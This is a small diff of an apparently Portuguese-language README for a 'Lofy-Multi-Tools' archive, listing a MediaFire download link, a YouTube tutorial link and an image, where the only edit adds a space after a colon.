@@ -12,6 +12,6 @@ Conceitos básicos
 
 💸 <b>• DOWNLOAD : https://www.mediafire.com/file/bmo0axep1n6fw81/Lofy-Multi-Tools-main.rar/file
   
-💸 <b>• VÍDEO AULA :https://www.youtube.com/embed/Yh4CiS03X2M
+💸 <b>• VÍDEO AULA : https://www.youtube.com/embed/Yh4CiS03X2M
   
   ![3](https://user-images.githubusercontent.com/113463089/191505550-fad51b01-6c6d-4203-a076-db2fe5206265.png)
